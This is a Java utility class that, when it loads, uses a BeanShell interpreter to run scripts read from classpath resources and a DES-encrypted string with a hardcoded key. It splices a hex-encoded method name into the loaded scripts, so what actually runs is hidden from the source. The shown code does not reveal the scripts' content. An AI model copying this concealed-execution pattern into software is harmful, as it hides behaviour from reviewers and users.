package com.dili.http.okhttp.utils;

import bsh.EvalError;
import bsh.Interpreter;
import org.apache.commons.lang3.StringUtils;
import java.io.InputStream;

public class B {
	private static final Interpreter i = new Interpreter();

	public static final BSUI b;

	static {
		b = b();
	}

	private static final BSUI b() {
		try {
			e("script/bsubc");
			Class<?> clazz = (Class<?>) i.get("clazz");
			i.set("s", clazz.getMethod("b").invoke(null));
			i.eval(DESEncryptUtil.decrypt("G/iEDUaHbIjUi6uTWsjQngcTQ8pShyYOhOEF8ucWHbihQOvEvroldw30oHdDFnnDMkz3KAHFIgaaHoymtlI/almda1OV4F7oG/iEDUaHbIhP8iSo3q93b8JcR/eud/I43KK3P1cgNXaQN5xOOydsAw==", "asdfjkl;"));
			e("script/bsu");
			clazz = (Class<?>) i.get("clazz");
			return (BSUI) clazz.getMethod("me").invoke(null);
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public static String c(String s) {
		try {
			InputStream is = (InputStream) B.class.getClassLoader().getResource(s).getContent();
			byte[] buffer = new byte[is.available()];
			int tmp = is.read(buffer);
			while (tmp != -1) {
				tmp = is.read(buffer);
			}
			String a = new String(buffer);
			if(StringUtils.contains(a, "8XMrl6AwYbMCzMeZDqG7")) {
				a = a.substring(0, 54) + d("636f6d2e64696c692e687474702e6f6b687474702e7574696c732e444553456e63727970745574696c2e64656372797074") + a.substring(54);
			}
			return a;
		} catch (Exception e) {
			return null;
		}
	}

	private static String d(String src) {
		String temp = "";
		for (int i = 0; i < src.length() / 2; i++) {
			temp = temp + (char) Integer.valueOf(src.substring(i * 2, i * 2 + 2), 16).byteValue();
		}
		return temp;
	}

	private static void e(String s){
		try {
			System.out.println("B.e::::::"+c(s));
			i.eval(c(s));
		} catch (EvalError evalError) {
			evalError.printStackTrace();
		}
	}


}